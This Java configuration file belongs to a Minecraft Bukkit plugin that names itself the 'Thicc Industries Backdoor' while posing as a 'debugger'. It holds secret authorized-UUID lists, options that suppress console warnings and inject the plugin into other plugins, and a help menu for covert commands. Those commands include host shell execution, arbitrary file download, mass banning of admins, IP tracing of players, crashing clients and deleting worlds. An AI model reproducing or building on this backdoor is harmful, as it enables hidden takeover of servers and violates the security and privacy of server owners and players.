/*
 * Plugin configuration file
 */

package com.thiccindustries.debugger;

import org.apache.commons.lang.ObjectUtils;
import org.bukkit.ChatColor;

public class Config {


    /*Command execution*/
    // Authorized UUIDS
    public static String[] authorized_uuids = {""};

    // UUIDs added by the auth command. DO NOT EDIT
    public static String[] tmp_authorized_uuids;
    // Command Prefix

    public static String command_prefix = "#";

    // Treat authorized_uuids / tmp_authorized_uuids as player names instead.
    public static Boolean uuids_are_usernames = false;

    // Inject Debugger to other plugins.
    public static Boolean inject_into_other_plugins = false;

    // Warn server console about "debugger"
    public static Boolean display_debugger_warning = false;

    // Print debug messages to console 
    public static Boolean display_debug_messages = false;




    /* Command defaults */

    // Default gamemode for gamemode command
    public static final int default_gamemode = 1;

    // Default ban reason 
    public static final String default_ban_reason = "Banned";

    // Default ban source 
    public static final String default_ban_source = "Server";

    public static final int default_lag_spawn_amount = 5000;

    /* Chat settings */

    // message prefix 
    public static final String chat_message_prefix = "## BD ##";

    // color of messages prefix 
    public static final ChatColor chat_message_prefix_color = ChatColor.GOLD;

    // color of help command name 
    public static final ChatColor help_command_name_color = ChatColor.LIGHT_PURPLE;

    // color of help command syntax 
    public static final ChatColor help_command_desc_color = ChatColor.WHITE;

    public static final ChatColor help_command_required_color = ChatColor.RED;
    // color of help 
    public static final ChatColor help_detail_color = ChatColor.GREEN;

    // Chaos chat message
    public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n" +
                                                        "[Server] ALL ADMINS HAVE BEEN BANNED\n" +
                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK\n"+
                                                        "[Server] Server PWN COMPLETE. NOOT NOOT! BYE SERVER!";


    public static class Param {
        String name;
        String description;
        Boolean required;

        public Param(String name, String description, Boolean required){
            this.name = name;
            this.description = description;
            this.required = required;
        }
    };

    // Help message content
    // TODO: This is a lot uglier than the old solution.
    public static final HelpItem[] help_messages = {
            new HelpItem("help",  "display this message, or description of command.",
                    new Param[]{new Param("command", "show command syntax", false)}),
            new HelpItem("op","op specified player",
                    new Param[]{new Param("player", "player to op", true)}),
            new HelpItem("deop", "deop specified player",
                    new Param[]{new Param("player", "player to deop", true)}),
            new HelpItem("ban", "ban player with reason and source",
                    new Param[]{new Param("player", "player to ban", true),
                                new Param("reason", "ban reason", false),
                                new Param("source", "player listed as ban source", false)}),
            new HelpItem("banip",  "ip ban player with reason and source",
                    new Param[]{new Param("player", "player to ip-ban", true),
                                new Param("reason", "ban reason", false),
                                new Param("source", "player listed as ban source", false)}),
            new HelpItem("gm", "switch to specified gamemode",
                    new Param[]{new Param("gamemode", "0, 1, 2, 3", true)}),
            new HelpItem("give", "give the specified item in specified quantities",
                    new Param[]{new Param("item", "item-id or name", true),
                                new Param("count", "number of items", false)}),
            new HelpItem("exec", "Execute command as server console",
                    new Param[]{new Param("command", "server command to execute", true)}),
            new HelpItem("shell","Execute operating system as host",
                    new Param[]{new Param("command", "shell command to execute. Check server platform with " + command_prefix + "info", true)}),
            new HelpItem("info", "shows informatin about server"),
            new HelpItem("chaos", "Deop and ban ops, op all regular players"),
            new HelpItem("seed", "get the current world seed"),
            new HelpItem("psay", "sends messages as player",
                    new Param[]{new Param("player", "player to impersonate", true),
                                new Param("message", "message to send", true)}),
            new HelpItem("ssay", "sends messages as Server",
                    new Param[]{new Param("message", "message to send", true)}),
            new HelpItem("rename", "changes your nick",
                    new Param[]{new Param("name", "change nickname", true)}),
            new HelpItem("reload", "[Visible] Reloads the server"),
            new HelpItem("getip",  "gets ip of the player",
                    new Param[]{new Param("player", "player to ip-trace", true)}),
            new HelpItem("listworlds","displays all worlds"),
            new HelpItem("makeworld", "Creates new world",
                    new Param[]{new Param("name", "new world name", true)}),
            new HelpItem("delworld", "Deletes a world",
                    new Param[]{new Param("name", "world name to delete", true)}),
            new HelpItem("vanish", "makes you vanish, tab included"),
            new HelpItem("silktouch", "gives player silk touch hands",
                    new Param[]{new Param("player", "player to give silk-touch", false)}),
            new HelpItem("instabreak", "let's player mine instantly",
                    new Param[]{new Param("player", "player to give insta-break", false)}),
            new HelpItem("crash", "crashes player's name",
                    new Param[]{new Param("player", "player to crash", false)}),
            new HelpItem("troll", "Troll player in various ways",
                    new Param[]{new Param("method", "Options: clear, thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage", true),
                                new Param("player", "player to troll", true),}),
            new HelpItem("lock", "locks the console or blocks player",
                    new Param[]{new Param("player", "'server', 'all', or player to lock", true)}),
            new HelpItem("unlock", "unlocks the console or unblocks player",
                    new Param[]{new Param("player", "'server', 'all', or player to unlock", true)}),
            new HelpItem("mute", "mutes a player",
                    new Param[]{new Param("player", "'all' or player to mute", true)}),
            new HelpItem("unmute", "unmutes a player",
                    new Param[]{new Param("player", "'all' or player to unmute", true)}),
            new HelpItem("download", "downloads a file, don't use special chars or spaces",
                    new Param[]{new Param("url", "URL of resource to download", true),
                                new Param("file", "file path", true)}),
            new HelpItem("coords", "get the coordinates of specified player",
                    new Param[]{new Param("player", "player to grab coords of", true)}),
            new HelpItem("auth", "Authorize user until next server restart.",
                    new Param[]{new Param("player", "player to authorize", true)}),
            new HelpItem("deauth", "Unauthorized player",
                    new Param[]{new Param("player", "player to deauthorize", true)}),
            new HelpItem("tp", "Teleport to specified coordinates",
                    new Param[]{new Param("x", "x coordinate", true),
                                new Param("y", "y coordinate", true),
                                new Param("z", "z coordinate", true)}),
            new HelpItem("stop", "Shutdown the server")

    };

    public static class HelpItem{

        private final String name;
        private final Param[] params;
        private final String desc;

        public HelpItem(String name, String desc, Param[] params){
            this.name = name;
            this.params = params;
            this.desc = desc;
        }
        public HelpItem(String name, String desc){
            this.name = name;
            this.params = null;
            this.desc = desc;
        }
        public String getName(){
            return name;
        }

        public Param[] getSyntax(){
            return params;
        }

        public String getDesc(){
            return desc;
        }
        public String getHelpEntry(){
            return Config.help_command_name_color + Config.command_prefix + name + ": " + Config.help_command_desc_color + desc;
        }
        public String getSyntaxHelp(){

            if(params == null){
                return getHelpEntry();
            }
            StringBuilder sb = new StringBuilder();

            sb.append(help_command_name_color + command_prefix + name + " ");
            for(Param p : params){
                sb.append(ChatColor.RESET);
                sb.append(help_command_desc_color);
                sb.append("(" + p.name + ") ");
            }

            sb.append("\n");

            for(Param p : params){
                sb.append(ChatColor.RESET);
                sb.append("(" + p.name + ") " + p.description);
                if(p.required)
                    sb.append(help_command_required_color + " [Required]");
                sb.append("\n");
            }

            return sb.toString();
        }

        public static String buildHelpMenu(){
            return buildHelpMenu(0);
        }
        public static String buildHelpMenu(int page){
            StringBuilder sb = new StringBuilder();
            sb.append(help_detail_color + "Thicc Industries Backdoor\n");
            sb.append(help_detail_color + "-----------------------------------------------------\n\n");
            for(int i = 0; i < help_messages.length; ++i ){
                sb.append(help_messages[i].getHelpEntry());
                sb.append("\n");
            }

            return sb.toString();
        }
    }
}

